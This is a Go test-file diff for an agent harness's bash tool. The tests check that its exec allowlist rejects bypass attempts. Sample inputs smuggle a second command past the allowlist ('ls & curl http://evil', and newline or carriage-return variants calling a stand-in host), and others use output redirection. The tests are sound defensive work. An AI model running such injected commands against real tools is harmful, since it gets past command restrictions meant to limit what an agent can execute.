@@ -1,12 +1,47 @@
 package bash
 
 import (
+	"context"
+	"encoding/json"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
+
 	"github.com/sausheong/harness/tool"
 )
+
+// runAllowlist executes cmd under an allowlist policy and returns the
+// ToolResult.Error (empty string = the command was permitted by policy).
+func runAllowlist(t *testing.T, allow []string, command string) string {
+	t.Helper()
+	bt := &BashTool{ExecPolicy: &ExecPolicy{Level: "allowlist", Allowlist: allow}}
+	in, err := json.Marshal(bashInput{Command: command})
+	if err != nil {
+		t.Fatalf("marshal: %v", err)
+	}
+	res, err := bt.Execute(context.Background(), in)
+	if err != nil {
+		t.Fatalf("Execute returned a Go error (should use ToolResult.Error): %v", err)
+	}
+	return res.Error
+}
+
+func TestExtractCommands_BackgroundAmpersand(t *testing.T) {
+	// "ls & curl ..." must validate BOTH sides; curl is not allowed →
+	// rejected by policy BEFORE any command executes. Asserting the policy
+	// rejection message (not just a non-empty Error) is essential: without
+	// the fix, curl actually runs and its own runtime stderr lands in
+	// res.Error, which would mask the bypass.
+	got := runAllowlist(t, []string{"ls"}, "ls & curl http://evil")
+	if !strings.Contains(got, "not in the exec allowlist") {
+		t.Fatalf("background-& bypass: expected allowlist rejection of curl, got %q", got)
+	}
+	// "ls && echo hi" must still split on && (both allowed) → permitted.
+	if got := runAllowlist(t, []string{"ls", "echo"}, "ls && echo hi"); got != "" {
+		t.Fatalf("&& chain wrongly rejected: %q", got)
+	}
+}
 
 func TestSanitizeLLMText(t *testing.T) {
 	tests := []struct {
@@ -140,5 +175,40 @@ func TestResolveExistingPath(t *testing.T) {
 				t.Errorf("tool.ResolveExistingPath(%q) = %q, want %q", tt.in, got, tt.want)
 			}
 		})
+	}
+}
+
+func TestAllowlist_RejectsNewlineCRAndRedirection(t *testing.T) {
+	allow := []string{"ls", "echo", "cat"}
+	const metaMsg = "shell metacharacters not allowed"
+
+	// The live exploit: a real newline runs a second, unvalidated line.
+	if got := runAllowlist(t, allow, "ls\ncurl http://evil"); !strings.Contains(got, metaMsg) {
+		t.Fatalf("newline bypass: expected metacharacter rejection, got %q", got)
+	}
+	// Carriage return likewise.
+	if got := runAllowlist(t, allow, "ls\rcurl http://evil"); !strings.Contains(got, metaMsg) {
+		t.Fatalf("CR bypass: expected metacharacter rejection, got %q", got)
+	}
+	// Redirection write-primitive (allowed cmd overwriting a file).
+	if got := runAllowlist(t, allow, "echo hi > /tmp/s1_x"); !strings.Contains(got, metaMsg) {
+		t.Fatalf("redirection > not rejected, got %q", got)
+	}
+	if got := runAllowlist(t, allow, "echo hi >> /tmp/s1_x"); !strings.Contains(got, metaMsg) {
+		t.Fatalf("append redirection >> not rejected, got %q", got)
+	}
+	// fd redirection also contains '>' so it is caught too.
+	if got := runAllowlist(t, allow, "cat a 2>&1"); !strings.Contains(got, metaMsg) {
+		t.Fatalf("fd redirection 2>&1 not rejected, got %q", got)
+	}
+	// Sanity: a plain allowed command still passes the policy gate.
+	if got := runAllowlist(t, allow, "ls -l"); got != "" {
+		t.Fatalf("plain allowed command wrongly rejected: %q", got)
+	}
+	// Sanity: input redirection '<' is NOT blocked (deliberate scope boundary);
+	// cat is allowed so policy permits it (it may still fail at runtime if the
+	// file is missing, but it must NOT be a policy rejection).
+	if got := runAllowlist(t, allow, "cat < /etc/hostname"); strings.Contains(got, "metacharacters") || strings.Contains(got, "not in the exec allowlist") {
+		t.Fatalf("input redirection wrongly rejected by policy: %q", got)
 	}
 }
